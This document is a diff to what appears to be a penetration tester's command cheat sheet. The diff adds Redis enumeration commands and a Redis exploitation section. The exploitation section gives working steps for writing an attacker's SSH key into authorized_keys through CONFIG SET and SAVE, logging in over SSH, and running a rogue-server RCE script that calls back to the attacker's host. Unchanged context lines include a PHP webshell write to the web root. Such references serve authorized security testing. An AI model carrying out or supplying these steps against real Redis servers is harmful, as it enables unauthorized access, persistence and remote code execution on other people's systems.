@@ -25,6 +25,8 @@
 ^Reminder:If Redis is discovered, test unauth access and inspect config/keys → run: Redis # 1
 ^Reminder:If Redis writable paths exist, evaluate file-write style attacks → run: Redis # 2
 ^Reminder:If you acquire a SQLite DB file from loot, open and enumerate locally → run: SQLite # 1
+^Reminder:If Redis GET returns WRONGTYPE, check key type first and use LRANGE/HGETALL/DUMP accordingly → run: Redis # 1
+^Reminder:If Redis CONFIG GET dir shows a writable Redis home or .ssh path, try authorized_keys write for SSH access → run: Redis # 2
 
 MySQL # 1:mysql -h <target> -P <port> -u <user> -p <password> # Connect to MySQL from Linux when you have credentials; kali-machine
 MySQL # 1:mysql -h <target> -P <port> -u root -p # Try connecting as root with password prompt. Try blank password first; kali-machine
@@ -73,6 +75,19 @@ SQLite # 1:SELECT * FROM sqlite_master WHERE type='table'; # List all tables; ka
 SQLite # 1:.exit # Exit sqlite3 shell; kali-machine
 SQLite # 1:.dump # Dump entire database as SQL; kali-machine
 
+Redis # 1:nmap --script redis-info -sV -p <port> <target> #enumerate Redis version and server information with Nmap before manual redis-cli checks; kali-machine
+Redis # 1:nc -vn <target> <port> #connect to Redis manually over raw TCP and type INFO/AUTH commands when redis-cli is unavailable; kali-machine
+Redis # 1:AUTH <user> <password> #authenticate to Redis ACL-enabled instance using username and password; kali-machine
+Redis # 1:client list #list connected Redis clients to identify active applications, internal IPs, and possible service users; kali-machine
+Redis # 1:INFO keyspace #show Redis databases with key counts to identify which DB indexes contain data; kali-machine
+Redis # 1:SELECT <db> #switch to Redis database index before listing or dumping keys; kali-machine
+Redis # 1:TYPE <key> #identify Redis key type before choosing GET, LRANGE, HGETALL, or DUMP; kali-machine
+Redis # 1:LRANGE <key> 0 -1 #dump all values from Redis list key when GET fails with WRONGTYPE; kali-machine
+Redis # 1:HGETALL <key> #dump all fields and values from Redis hash key; kali-machine
+Redis # 1:DUMP <key> #dump serialized Redis key value when key type is unusual or standard reads fail; kali-machine
+Redis # 1:MONITOR #watch Redis commands in real time to identify application behaviour and sensitive operations; kali-machine
+Redis # 1:SLOWLOG GET 25 #show recent slow Redis queries to identify application usage patterns and interesting keys; kali-machine
+
 Redis # 1:redis-cli -h <target> # Connect to Redis. Often no authentication required; kali-machine
 Redis # 1:redis-cli -h <target> -a <password> # Connect with password if authentication required; kali-machine
 Redis # 1:INFO # Get Redis server information (version, OS, etc.); kali-machine
@@ -84,6 +99,13 @@ Redis # 1:GET <key> # Retrieve value for specific key; kali-machine
 Redis # 1:MGET <key1> <key2> <key3> # Get multiple keys at once; kali-machine
 Redis # 1:AUTH <password> # Authenticate to Redis; kali-machine
 
+Redis # 2:(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > <filename1> #prepare SSH public key with padding so Redis can write it cleanly as authorized_keys; kali-machine
+Redis # 2:cat <filename1> | redis-cli -h <target> -p <port> -x set ssh_key #write prepared SSH public key into Redis key for authorized_keys file-write attack; kali-machine
+Redis # 2:CONFIG SET dir /var/lib/redis/.ssh #set Redis write directory to redis user's SSH directory if writable; kali-machine
+Redis # 2:CONFIG SET dbfilename authorized_keys #set Redis output filename to authorized_keys for SSH key injection; kali-machine
+Redis # 2:SAVE #force Redis to write database file to disk and create or overwrite authorized_keys; kali-machine
+Redis # 2:ssh -i ~/.ssh/id_rsa redis@<target> #log in as redis user after authorized_keys write succeeds; kali-machine
+Redis # 2:./redis-rogue-server.py --rhost <target> --lhost <kali> #test Redis rogue-server RCE against vulnerable Redis versions when unauthenticated access and module-loading conditions apply; kali-machine
 Redis # 2:SET <key> "<value>" # Set key value if you have write access; kali-machine
 Redis # 2:CONFIG SET dir /var/www/html # Change working directory to web root for webshell upload; kali-machine
 Redis # 2:CONFIG SET dbfilename shell.php # Set filename to PHP file; kali-machine
